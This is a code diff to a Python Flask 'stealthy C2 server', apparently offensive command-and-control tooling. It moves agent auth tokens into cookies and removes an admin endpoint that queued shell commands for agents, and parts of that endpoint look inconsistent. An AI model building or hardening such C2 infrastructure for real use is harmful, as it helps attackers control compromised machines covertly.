@@ -1,4 +1,3 @@
-#!/usr/bin/env python3
 """
 Enhanced Stealthy C2 Server using Python and Flask
 ----------------------------------------------------
@@ -203,10 +202,12 @@ def check_in():
         resp = {
             'status': 'Success', 
             'timestamp': checkin_time,
-            'token': token
         }
 
-        return jsonify(resp), 200 
+        response = jsonify(resp)
+        response.set_cookie('auth_token', token, httponly=True, secure=True, samesite='Strict')
+
+        return response, 200 
     
     except Exception as e:
         logging.error(f"Error processing agent check-in: {e}")
@@ -221,11 +222,10 @@ def c2_endpoint():
     Agents send a JSON payload with their "id". The server responds with the next command (if any).
     """
     try:
-        data = request.get_json(force=True)
-        token = data.get("token")
-
+        token = request.cookies.get('auth_token')
         if not token:
-            return jsonify({"error": "Missing token"}), 400
+            logging.warning('Missing auth cookie')
+            return jsonify({"error": "Missing auth cookie"}), 400
         
         agent_id = token_to_agent.get(token)
 
@@ -258,35 +258,6 @@ def c2_endpoint():
 
     except Exception as e:
         logging.error(f"Error processing agent check-in: {e}")
-        return jsonify({"error": "Invalid request format"}), 400
-
-@app.route('/admin/add_command', methods=['POST'])
-def add_command():
-    """
-    Admin endpoint to add a new command to an agent's queue.
-    Expects a JSON payload with "agent_id", "cmd", and optionally "type" (default: "shell").
-    """
-    try:
-        data = request.get_json(force=True)
-        stg = data.get("stg")
-        cmd = data.get("cmd")
-        cmd_type = data.get("type", "shell")
-
-        if not stg or not cmd:
-            return jsonify({"error": "Missing agent_id or cmd"}), 400
-
-        # Append the command with the current timestamp.
-        command_entry = {
-            "cmd": cmd,
-            "type": cmd_type,
-            "timestamp": time.time()
-        }
-        order[stg].setdefault(stg, []).append(command_entry)
-        logging.info(f"Admin added command for agent at {stg}: {cmd}")
-        return jsonify({"message": "Command added successfully"}), 200
-
-    except Exception as e:
-        logging.error(f"Error adding command: {e}")
         return jsonify({"error": "Invalid request format"}), 400
 
 if __name__ == '__main__':
